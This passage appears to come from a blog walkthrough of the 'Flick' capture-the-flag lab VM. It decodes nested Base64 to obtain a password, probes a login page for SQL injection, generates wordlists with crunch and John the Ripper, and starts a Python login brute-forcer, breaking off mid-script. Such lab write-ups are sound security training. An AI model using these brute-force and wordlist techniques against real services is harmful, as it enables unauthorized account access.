</span><span class='line'>\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
</span><span class='line'>\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
</span><span class='line'>\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
</span><span class='line'>\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
</span><span class='line'>\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
</span><span class='line'>\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
</span><span class='line'>\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
</span><span class='line'>\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
</span><span class='line'>\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
</span><span class='line'>\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
</span><span class='line'>\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
</span><span class='line'>\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
</span><span class='line'>\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
</span><span class='line'>\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
</span><span class='line'>\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
</span><span class='line'>\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
</span><span class='line'>\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
</span><span class='line'>\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
</span><span class='line'>\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
</span><span class='line'>\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
</span><span class='line'>\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
</span><span class='line'>\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
</span><span class='line'>\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
</span><span class='line'>\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
</span><span class='line'>\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
</span><span class='line'>\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
</span><span class='line'>\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
</span><span class='line'>\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
</span><span class='line'>\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
</span><span class='line'>\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
</span><span class='line'>\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
</span><span class='line'>\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
</span><span class='line'>\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
</span><span class='line'>\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
</span><span class='line'>\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
</span><span class='line'>\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d
</span><span class='line'>
</span><span class='line'> .o88o. oooo   o8o            oooo        
</span><span class='line'> 888 `" `888   `"'            `888        
</span><span class='line'>o888oo   888  oooo   .ooooo.   888  oooo  
</span><span class='line'> 888     888  `888  d88' `"Y8  888 .8P'   
</span><span class='line'> 888     888   888  888        888888.    
</span><span class='line'> 888     888   888  888   .o8  888 `88b.  
</span><span class='line'>o888o   o888o o888o `Y8bod8P' o888o o888o 
</span><span class='line'>                                          
</span><span class='line'>
</span><span class='line'>root@192.168.80.129's password: </span></code></pre></td></tr></table></div></figure>


<p>I copied that block of hex to an online hex to string converter that spit out a Base64 encoded string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==</span></code></pre></td></tr></table></div></figure>


<p>Moving to a Base64 decoder, it appears to be decoded into&hellip;another Base64 string?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=</span></code></pre></td></tr></table></div></figure>


<p>This kept happening for the next decodings, so I lost my patience and went to Python to script the decoding process:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
</span><span class='line'>
</span><span class='line'><span class="n">secret</span> <span class="o">=</span> <span class="s">&#39;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">secret</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Try &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">count</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;: &#39;</span> <span class="o">+</span> <span class="n">secret</span>
</span><span class='line'>        <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">except</span> <span class="ne">TypeError</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Done&#39;</span>
</span><span class='line'>        <span class="k">break</span>
</span></code></pre></td></tr></table></div></figure>


<p>It took 16 decodings to produce a non Base64 string that might work as password for the admin server. The end result is <code>tabupJievas8Knoj</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc 192.168.80.129 8881
</span><span class='line'>Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
</span><span class='line'>&gt; tabupJievas8Knoj
</span><span class='line'>OK: tabupJievas8Knoj
</span><span class='line'>
</span><span class='line'>Accepted! The door should be open now :poolparty:
</span><span class='line'>
</span><span class='line'>&gt; </span></code></pre></td></tr></table></div></figure>


<p>I tried poolparty as the SSH password but of course it wouldn&rsquo;t be that easy! We started with only 2 open ports, so there isn&rsquo;t much room for progression on that front, but what door is open now? I started another Nmap scan, and there is indeed something that wasn&rsquo;t here before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
</span><span class='line'>|_http-title: Flick-a-Photo
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/flick/cats.png" title="flick a photo" alt="flick cats"></p>

<p>It&rsquo;s an image gallery of cats. After you feasted your eyes on all of them, check the login page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/flick/login.png" title="login" alt="login"></p>

<p>Right, I don&rsquo;t see any credentials lying around in the source. I tried modifying the URL from <code><a href="http://192.168.80.129/login/login">http://192.168.80.129/login/login</a></code>, and there is a directory index coming up, but it&rsquo;s fake:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/flick/index.png" title="fake index" alt="index"></p>

<p>You get the same page no matter what you add in the URL or click on the supposed directories. I tried SQL injection next. If you insert a single quote, you get this message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND user.password=' at line 1</span></code></pre></td></tr></table></div></figure>


<p>But this message remains unchanged no matter the variation of the injections, and there is no reaction if you try double quotes or backslashes. I tested it with Sqlmap and it reported that none of the parameters are dynamic nor injectable, so it seems like another fake lead.</p>

<p>Right, so it&rsquo;s time to focus on the hint. I tried logging in with <em>demo:demo</em>, but it didn&rsquo;t work. Because the hint specified a demo user, it&rsquo;s safe to assume the username will be demo. And with no other hint, and lengthy bruteforcing not being a desired goal of the exercise, we can assume that the password is also some variation that includes the word demo. Most likely an addition of a few digits. Whenever I think the password would be weak and obvious, or I am clueless and hope for the best, I try the obvious word by itself, or followed by 123 or 1234. I never really expect it to work, but..it did! The password is actually <em>demo123</em>. However, for the sake of exercise, let&rsquo;s assume we didn&rsquo;t imagine any possible password and we need to do it conventionally..by building a wordlist and bruteforcing the login page.</p>

<p>So, the first step is to build a wordlist. If we think about it, the password will most likely contain the word demo, so its minimum length would be 5 (already tried demo), and its maximum would be 8, to accommodate some trailing digits / letters, or a repetition of the word itself. I will give 2 examples of creating a wordlist, but will use a much reduced list for the actual bruteforcing part.</p>

<p>In the first example, I used crunch to generate a wordlist. To keep up with the constraints, it should be composed of 5-8 characters, with the string &ldquo;demo&rdquo; occurring at the beginning or the end. I assummed the letters would be lowercase only.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>crunch 7 7 -t demo%%% -o /root/Desktop/wordlist.txt
</span><span class='line'>Crunch will now generate the following amount of data: 8000 bytes
</span><span class='line'>0 MB
</span><span class='line'>0 GB
</span><span class='line'>0 TB
</span><span class='line'>0 PB
</span><span class='line'>Crunch will now generate the following number of lines: 1000 
</span><span class='line'>
</span><span class='line'>crunch: 100% completed generating output
</span><span class='line'>...
</span><span class='line'>crunch 7 7 -t demo@@@ -o /root/Desktop/wordlist2.txt
</span><span class='line'>Crunch will now generate the following amount of data: 140608 bytes
</span><span class='line'>0 MB
</span><span class='line'>0 GB
</span><span class='line'>0 TB
</span><span class='line'>0 PB
</span><span class='line'>Crunch will now generate the following number of lines: 17576 
</span><span class='line'>
</span><span class='line'>crunch: 100% completed generating output</span></code></pre></td></tr></table></div></figure>


<p>In this example, I specified the min and max length as 7 (since I couldn&rsquo;t figure out from my speedy reading how to make crunch to build variable length words from the pattern, to build a full wordlist I would repeat it for every length and pattern that must be met and merge the results). The <em>-o</em> parameter is for the output file, and the <em>-t</em> parameter is for the pattern, followed by wildcard symbols (<em>%</em> for numbers, <em>@</em> for lowercase).</p>

<p>The second example will use our buddy, John the Ripper. Starting from a file called demo.txt, which only has the word demo in it, I let john build passwords originating from the word demo by using the jumbo rules from <code>/etc/john/john.conf</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john --rules=jumbo --wordlist=demo.txt --stdout &gt;&gt; wordlist.txt
</span><span class='line'>words: 5116  time: 0:00:00:00 DONE (Wed Feb 11 14:44:42 2015)  w/s: 102320  current: DEMO</span></code></pre></td></tr></table></div></figure>


<p>This wordlist also contains uppercase variations. Here&rsquo;s a breakdown of the command:</p>

<ul>
<li><strong>&mdash;rules=jumbo</strong> Enables wordlist rules, that are read from [List.Rules:Wordlist]
                  in  /etc/john/john.conf  (or  the alternative configuration file
                  you might specify on the command line).
                  This option requires the -wordlist option to be passed as well.</li>
</ul>


<p>And the jumbo rules from john&rsquo;s configuration file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># For Wordlist mode and very fast hashes
</span><span class='line'>[List.Rules:Jumbo]
</span><span class='line'>.include [List.Rules:Wordlist]
</span><span class='line'>.include [List.Rules:Single]
</span><span class='line'>.include [List.Rules:Extra]
</span><span class='line'>.include [List.Rules:NT]</span></code></pre></td></tr></table></div></figure>


<p>So this actually includes 4 other rules.</p>

<ul>
<li><p><strong>&mdash;wordlist=demo.txt</strong> These are used to enable the wordlist mode, reading  words  from FILE.</p></li>
<li><p><strong>&mdash;stdout >> wordlist.txt</strong> When used with a cracking mode, except for &ldquo;single crack&rdquo;, makes
                             John print the words it generates to stdout instead of cracking.</p></li>
</ul>


<p>Since we aren&rsquo;t cracking anything, we redirect the passwords to a file.</p>

<p>Next, for the bruteforcing part, I will use just a few samples to illustrate the exercise.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# cat wordlist.txt
</span><span class='line'>demodemo
</span><span class='line'>demo007
</span><span class='line'>demo123</span></code></pre></td></tr></table></div></figure>


<p>I wrote a Python script to attempt the login:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">urllib</span><span class="o">,</span> <span class="nn">urllib2</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">cookielib</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">wordlist</span> <span class="o">=</span> <span class="s">&#39;/root/Desktop/wordlist.txt&#39;</span>
</span><span class='line'><span class="n">passwords</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
</span><span class='line'>        <span class="n">passwords</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://192.168.80.129/login/login&#39;</span>
</span><span class='line'><span class="n">fail</span> <span class="o">=</span> <span class="s">&#39;Your username/password combination was incorrect&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">username</span> <span class="o">=</span> <span class="s">&#39;demo&#39;</span>
</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">jar</span> <span class="o">=</span> <span class="n">cookielib</span><span class="o">.</span><span class="n">CookieJar</span><span class="p">()</span>
